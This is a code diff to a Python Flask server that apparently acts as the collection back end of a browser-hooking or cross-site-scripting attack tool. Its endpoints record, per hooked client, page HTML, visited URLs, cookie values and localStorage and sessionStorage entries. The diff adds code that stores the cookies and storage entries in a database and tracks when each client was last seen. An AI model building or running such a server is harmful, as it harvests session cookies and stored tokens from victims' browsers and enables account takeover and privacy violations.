@@ -256,8 +256,9 @@ def clientSeen(identifier):
 
     # for client in clients:
     #     print("Client id: " + str(client.id) + ", nickname: " + client.nickname)
+
     client = Client.query.filter_by(nickname=identifier).first()
-    print("** in clientSeen func, clientID: " + str(client.id) + ", nickname: " + client.nickname)
+    # print("** in clientSeen func, clientID: " + str(client.id) + ", nickname: " + client.nickname)
     client.update()
 
 
@@ -343,6 +344,7 @@ def recordHTML(identifier):
     # Put it in the DB
     newHtml = HtmlCode(clientID=identifier, url=content['url'], code=content['html'])
     db.session.add(newHtml)
+    clientSeen(identifier)
     dbCommit()
 
     return "ok", 200
@@ -364,6 +366,7 @@ def recordUrl(identifier):
     # Put it in the DB
     newUrl = UrlVisited(clientID=identifier, url=content['url'])
     db.session.add(newUrl)
+    clientSeen(identifier)
     dbCommit()
 
     return "ok", 200
@@ -406,6 +409,14 @@ def recordCookie(identifier):
     cookieValue = content['cookieValue']
     logEvent(identifier, "Cookie Name: " + cookieName + ", value: " + cookieValue)
 
+
+    # Put it in the DB
+    newCookie = Cookie(clientID=identifier, cookieName=cookieName, cookieValue=cookieValue)
+    db.session.add(newCookie)
+    clientSeen(identifier)
+    dbCommit()
+
+
     return "ok", 200
 
 
@@ -420,6 +431,13 @@ def recordLocalStorageEntry(identifier):
     localStorageValue = content['value']
     logEvent(identifier, "Local Storage Entry: " + localStorageKey + ", value: " + localStorageValue)
 
+
+    # Put it in the DB
+    newLocalStorage = LocalStorage(clientID=identifier, key=localStorageKey, value=localStorageValue)
+    db.session.add(newLocalStorage)
+    clientSeen(identifier)
+    dbCommit()
+
     return "ok", 200
 
 
@@ -433,6 +451,13 @@ def recordSessionStorageEntry(identifier):
     sessionStorageKey = content['key']
     sessionStorageValue = content['value']
     logEvent(identifier, "Session Storage Entry: " + sessionStorageKey + ", value: " + sessionStorageValue)
+
+    # Put it in the DB
+    newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
+    db.session.add(newSessionStorage)
+    clientSeen(identifier)
+    dbCommit()
+
 
     return "ok", 200
 
